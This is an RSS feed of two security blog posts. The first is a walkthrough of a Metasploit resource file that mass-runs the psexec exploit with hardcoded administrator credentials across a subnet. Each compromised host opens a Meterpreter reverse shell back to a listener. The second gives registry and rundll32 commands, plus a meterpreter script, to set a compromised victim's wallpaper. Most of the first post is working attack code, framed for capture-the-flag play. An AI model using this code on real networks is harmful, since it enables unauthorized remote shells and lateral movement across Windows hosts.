<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>script on malicious.link</title>
    <link>https://malicious.link/categories/script/</link>
    <description>Recent content in script on malicious.link</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Wed, 19 Feb 2014 23:33:50 -0500</lastBuildDate>
    
        <atom:link href="https://malicious.link/categories/script/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Rapid fire PSEXEC for Metasploit</title>
      <link>https://malicious.link/post/2010/2010-09-12-rapid-fire-psexec-for-metasploit/</link>
      <pubDate>Sun, 12 Sep 2010 15:06:39 +0000</pubDate>
      
      <guid>https://malicious.link/post/2010/2010-09-12-rapid-fire-psexec-for-metasploit/</guid>
      <description>&lt;p&gt;Exploit modules inside of metasploit don&amp;rsquo;t have the ability to run on multiple hosts with one swing of the bat. So I created some code to facilitate that. It&amp;rsquo;s really not much but there are some really juicy pieces of knowledge I learned on the way here.&lt;/p&gt;
&lt;p&gt;// The following is a resource file, but instead of just giving you something to download or straight copy and paste, I&amp;rsquo;ve broken it up into sections. Also take note of the &amp;ldquo;setg&amp;rdquo; which sets the variable globally so that I don&amp;rsquo;t have to set it inside of the psexec module.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;use multi/handler  
setg PAYLOAD windows/meterpreter/reverse_tcp  
setg LHOST 192.168.1.114  
setg LPORT 80  
set ExitOnSession false

exploit -j -z
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This first part, while nothing spectacular, sets the multi/handler up before hand so that each run of the exploit module doesn&amp;rsquo;t have to set up and tear down the handler. = fast. The following though is just the setup for the module.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;use windows/smb/psexec  
set SMBUser Administrator  
set SMBPass password123
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here is where it gets interesting though. Windows systems want something in SMBDomain, if they aren&amp;rsquo;t joined to a domain they can take pretty much anything here.&lt;/p&gt;
&lt;p&gt;However if they are actually joined to a domain, you either have to have the computer name (which definitely won&amp;rsquo;t play well with a scanner easily) or use domain credentials.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;set SMBDomain .
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &amp;ldquo;.&amp;rdquo; is something every Windows API programmer would know as it&amp;rsquo;s really well documented, but certainly not every Metasploit user. What it means is basically localhost, since SMB won&amp;rsquo;t take either localhost or 127.0.0.1.&lt;/p&gt;
&lt;p&gt;Next up, we don&amp;rsquo;t want each run of the exploit module to build the multi/handler and tear it down every single run. That&amp;rsquo;s why we built it first and set DisablePayloadHandler inside of the psexec module.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;set DisablePayloadHandler true
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Resource files have been able run blocks of ruby in metasploit since revision 8876. By putting the &lt;code&gt;&amp;lt;ruby&amp;gt;&lt;/code&gt; html like block identifier you can then use the power of Ruby combined with Rex (Metasploit&amp;rsquo;s API) to do really cool stuff.&lt;/p&gt;
&lt;p&gt;More setup, but this time for the ruby portion. Using Metasploit&amp;rsquo;s RangeWalker, we can take all kinds of input, an IP, a CIDR range, and even a line separated file of IP addresses using the &amp;ldquo;file:&amp;rdquo; prefix.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;ruby&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;  
require &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rex/socket/range_walker&amp;#39;&lt;/span&gt;  
rhosts &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;192.168.92.0/24&amp;#34;&lt;/span&gt;  
iplist &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Rex&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Socket&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RangeWalker&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(rhosts)  
iplist&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;each &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;rhost&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So, we&amp;rsquo;ve included RangeWalker, parsed it, and loaded it into an &amp;lsquo;each&amp;rsquo; for loop.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;self.run_single&lt;/code&gt; function allows you to send commands like you were outside of the ruby block to msfconsole. We are setting the RHOST to each IP that RangeWalker parsed out, simple right?&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;	self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;run_single(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;set RHOST &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;rhost&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)  
	self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;run_single(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;exploit -j -z&amp;#34;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;  
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/ruby&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;That&amp;rsquo;s it, we send all of the exploit modules one at a time to the background and tell it not to interact with it using the &amp;ldquo;-z -j&amp;rdquo; just as we did with multi/handler.&lt;/p&gt;
&lt;p&gt;Now, if your credentials worked on any of the IPs you&amp;rsquo;ll have sessions waiting for you.&lt;/p&gt;
&lt;p&gt;This can easily be extended with one more loop and a bit of shuffling to make this in to a SMB bruteforcer that accepts hashes!.&lt;/p&gt;
&lt;p&gt;Hope you learned a few things. Oh, and just a caveat, this is NOT quiet or stealthy and will probably get you caught on a blackbox pentest, but this is really great for the smash and grab style of  CTF competitions.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Set Wallpaper Meterpreter Script</title>
      <link>https://malicious.link/post/2010/2010-06-28-set-wallpaper-meterpreter-script/</link>
      <pubDate>Mon, 28 Jun 2010 20:34:43 +0000</pubDate>
      
      <guid>https://malicious.link/post/2010/2010-06-28-set-wallpaper-meterpreter-script/</guid>
      <description>&lt;p&gt;Certainly nothing to fuss over, but I&amp;rsquo;ve had a fascination with setting my target&amp;rsquo;s wallpaper as sort of a calling card for years now. I&amp;rsquo;ve been able to set the registry key (HKCUControl PanelDesktopWallpaper), but until recently I didn&amp;rsquo;t know how to get it to refresh so that it displayed without forcing the user to log out&amp;hellip;&lt;/p&gt;
&lt;p&gt;First, is the most important part, selection of the wallpaper. This is my first selection:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201006_wallpaper_1.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;But, it has to be a BMP. So, I created:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://malicious.link/images/metasploit_1024.bmp&#34;&gt;metasploit_1024.bmp&lt;/a&gt; (2.3 MB)&lt;/p&gt;
&lt;p&gt;next run:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;reg add &amp;quot;HKCU\Control Panel\Desktop&amp;quot; /v Wallpaper /t REG_MULTI_SZ /d &amp;quot;C:\metasploit_1024.bmp&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and finally the magic:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;rundll32.exe user32.dll,UpdatePerUserSystemParameters&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;thats it, run that, and it&amp;rsquo;ll refresh the settings and display the wallpaper in all of it&amp;rsquo;s glory. But I wouldn&amp;rsquo;t be a metasploit dog if I didn&amp;rsquo;t make it into a meterpreter script:&lt;/p&gt;
&lt;p&gt;download: &lt;a href=&#34;https://github.com/mubix/stuff/blob/master/metasploit/wallpaper.rb&#34;&gt;wallpaper.rb&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;it&amp;rsquo;s definitely not ready to be in the trunk, but it works, just edit each of the options in the file to point at the bmp you want on the victim&amp;rsquo;s wallpaper and it&amp;rsquo;ll be there.&lt;/p&gt;
&lt;p&gt;Todo:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Make each parameter an option so there is no text editing involved&lt;/li&gt;
&lt;li&gt;Add the ability to convert other image types on the fly&lt;/li&gt;
&lt;li&gt;Figure out how to get the desktop color to refresh with the wallpaper&lt;/li&gt;
&lt;/ol&gt;
</description>
    </item>
    
  </channel>
</rss>
